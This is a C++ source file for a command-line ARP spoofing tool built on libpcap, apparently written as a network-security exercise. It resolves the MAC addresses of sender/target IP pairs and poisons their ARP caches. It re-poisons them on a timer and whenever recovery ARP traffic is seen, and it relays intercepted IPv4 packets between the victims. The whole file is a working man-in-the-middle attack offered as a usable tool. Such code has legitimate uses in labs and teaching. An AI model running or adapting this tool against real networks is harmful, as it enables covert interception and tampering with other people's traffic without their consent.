#include <cstdio>
#include <stdlib.h>
#include "arp.h"

char** sender_ip;
char** target_ip;
Mac* sender_mac;
Mac* target_mac;
Mac my_macaddr;
Ip my_ipaddr;

void usage(){
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc >= 4 && argc % 2 == 1)) {
		usage();
		return -1;
	}

	int pair = (argc-2)/2;

	sender_ip = (char**)malloc(sizeof(char*) * pair);
	target_ip = (char**)malloc(sizeof(char*) * pair);
	sender_mac = (Mac*)malloc(sizeof(Mac) * pair);
	target_mac = (Mac*)malloc(sizeof(Mac) * pair);
	int idx = 0;
	char* interface = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	my_macaddr = my_mac(interface);
	my_ipaddr = my_ip(interface);
	

	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}
	for(int i = 2; i < argc; i += 2){	
		sender_ip[idx] = argv[i];
		target_ip[idx] = argv[i + 1];

		sender_mac[idx] =get_mac_addr(handle, sender_ip[idx]);
		target_mac[idx] =get_mac_addr(handle, target_ip[idx]);
		printf("[*] sender%d : [IP = %s, MAC = %s]\n",idx + 1,sender_ip[idx], std::string(sender_mac[idx]).c_str());
		printf("[*] target%d : [IP = %s, MAC = %s]\n",idx + 1,target_ip[idx], std::string(target_mac[idx]).c_str());

		idx++;
	}

	for(int i = 0; i < pair; i++){		
		arp_spoof_init(handle,i);
	}

	int cnt = 0;
	clock_t start = clock();
	clock_t end;
	float runtime;


	while(true){
		end = clock();
		runtime = (float)(end - start)/CLOCKS_PER_SEC;
		if(runtime > 0.5){
			for(int i = 0; i < idx; i++){
				arp_spoof_init(handle, i);
			}
		}
		struct pcap_pkthdr* header;
		const u_char * pkt_data ;
		int res = pcap_next_ex(handle, &header,&pkt_data);
		if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
		EthHdr *eth_packet = (EthHdr*)pkt_data;

		if(eth_packet -> type_ == htons(EthHdr::Arp)){
			EthArpPacket *arp_packet = (EthArpPacket*)pkt_data;
			printf("[*] arp found [sender IP = %s, target IP = %s]\n",std::string(Ip(htonl(arp_packet -> arp_.sip_))).c_str(),std::string(Ip(htonl(arp_packet -> arp_.tip_))).c_str());
			for(int i = 0; i < idx; i++){
				if(arp_packet -> arp_.sip_ == Ip(htonl(Ip(sender_ip[i])))){
					printf("recover\n");
					arp_spoof_init(handle, i);
				}
				if(arp_packet -> arp_.sip_ == Ip(htonl(Ip(target_ip[i])))){
					printf("recover\n");
					arp_spoof_init(handle, i);
				}

			}
		}
		if(eth_packet -> type_ == htons(EthHdr::Ip4)){
			struct packet_info *p_info = (struct packet_info*) pkt_data;

			
	        // for(int i=0; i<4; i++){
	        //     if(i == 3){
	        //         printf("%d\n", ((uint8_t *) &(p_info->ipv4.ip_src))[i]);
	        //         break;
	        //     }
	        //     printf("%d.", ((uint8_t *) &(p_info->ipv4.ip_src))[i]); 
	        // }    
	        // for(int i=0; i<4; i++){
	        //     if(i == 3){
	        //         printf("%d\n", ((uint8_t *) &(p_info->ipv4.ip_dst))[i]);
	        //         break;
	        //     }
	        //     printf("%d.", ((uint8_t *) &(p_info->ipv4.ip_dst))[i]); 
	        // }    

			//printf("%x\n",ntohl(p_info->ipv4.ip_src.s_addr));
			for(int i = 0; i < idx; i++){
				//printf("%d : %x\n",i,(uint32_t)Ip(sender_ip[i]));
				if(ntohl(p_info->ipv4.ip_src.s_addr) != (uint32_t)Ip(sender_ip[i]))
					continue;
				if(ntohl(p_info->ipv4.ip_dst.s_addr) != (uint32_t)Ip(target_ip[i]))
					continue;
				printf("------------------------\n");
				relay_packet(handle, (uint8_t*)pkt_data,i);
				printf("relay\n");
				printf("------------------------\n");
			
			}
			
		}
		
	}



	free(sender_mac);
	free(sender_ip);
	free(target_ip);
	pcap_close(handle);
	
	return 0;
}
